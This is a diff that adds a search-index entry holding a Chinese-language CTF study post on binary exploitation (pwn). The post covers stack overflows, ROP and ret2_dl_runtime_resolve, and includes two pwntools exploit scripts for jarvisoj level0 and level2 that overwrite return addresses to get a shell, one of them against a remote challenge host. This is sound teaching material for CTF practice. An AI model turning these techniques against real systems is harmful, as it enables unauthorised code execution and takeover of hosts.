@@ -115,4 +115,21 @@
       <tags></tags>
     </entry>
   
+    <entry>
+      <title><![CDATA[面向板子写exp]]></title>
+      <url>/curriculum_self/2017/07/18/exploit/</url>
+      <content type="text"><![CDATA[pwn 是什么钻可执行二进制文件的空子的一种技术。pwn 需要的工具  一些python技能  pwntools  ida  gdb  关于程序漏洞的基础知识pwn 可以干什么利用提前写好的脚本攻击某一个进程，控制运行这个进程的主机。也就是常说的getshell。几个基础漏洞  栈溢出  堆溢出  格式化字符串漏洞  其他 ——对不起我还没有学到这里来TAT例子简单栈溢出关于栈的内容：click!      jarvisoj-level1    直接往栈上直接写shellcode。将返回地址覆盖成shellcode开始的地址。   两个条件：          NX防护没有开      知道栈地址                jarvisoj-level0                  漏洞是明显的栈溢出。            自带getshell函数。                      checksec可以发现            PIE没开，所以可以直接攻击他的返回地址。                       exp ```python from pwn import *              sh= process(“./level0”) system_addr=0x400596 payload=’A’ * 0x80 +’B’ * 0x8 +p64(system_addr)    sh.sendline(payload) sh.interactive() ```        jarvisoj-level2    这道题没有直接的system("/bin/sh"),需要在伪造返回地址的基础上构造参数。     from pwn import * payload = 'a'*(0x88+0x4) elf=ELF("./level2") sys_addr=elf.symbols["system"] bin_addr=elf.search("/bin/sh").next() payload += p32(sys_addr)+p32(0xdeadbeef)+p32(bin_addr) sh=remote("pwn2.jarvisoj.com",'9878') sh.sendline(payload) sh.interactive()      基础 ROP 利用ctfwiki上讲的太详细了=v&lt;smallbug3  关于canary和pie的ret2_dl_runtime_resolve概念  四个section          .dynamic         保存了下面三个section的指针。         2. .dynstr    是一个字符串表，内容是指针，指向函数名字符串。          3. .dynsym    是一个结构体数组。          4. .rel.plt     也是一个结构体数组。      __dl_runtime_resolve 大致流程攻击手段改写.dynstr节的指针让这个指针指向我们需要的函数名字符串，例如system字符串  缺陷  只有在NO RELRO时候才有权限更改.dynstr。伪造结构体因为函数的执行过程就是不断地寻找结构体，从结构体中拿数据，而在函数源码中，并不会检查offset是否会过界，所以我们可以在可控制的地方伪造结构体，来调用目标函数。      计算fake_rel和.rel.plt的距离偏移量作为offset，注意64位需要除以sizeof(ELF32_REL)。        伪造一fake_rel，使他的rel_info字段成为0x******07，这个07是导入函数的参数。暂时不知道干嘛的，但最好不要改。        ******是指fake_sym距离.dynsym的偏移/sizeof(ELF32_SYM)。        fake_sym中st_name是fake_string距离.dynstr的偏移量。  三道题heapunlinkHOFUAF格式化字符串漏洞其他只了解了一个.init_array 和 .fini_array节存放了指向初始化代码和终止代码的函数指针。.init_array函数指针会在调用main()之前被触发，.fini_array函数指针在main()执行完后才被触发。 这就意味着可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。写exp时的几个trick  显示发送和接收的数据    context.log_level = 'debug'        debug    context.terminal = ['deepin-termina','-x','sh','-c']sh=process('./elffile')gdb.attach(sh)        不用写libc的绝对路径    libc = ELF('./elffile').libc      ]]></content>
+      <categories>
+        
+          <category> curriculum_self </category>
+        
+      </categories>
+      <tags>
+        
+          <tag> vulnerability_overview </tag>
+        
+      </tags>
+      <tags></tags>
+    </entry>
+  
 </search>
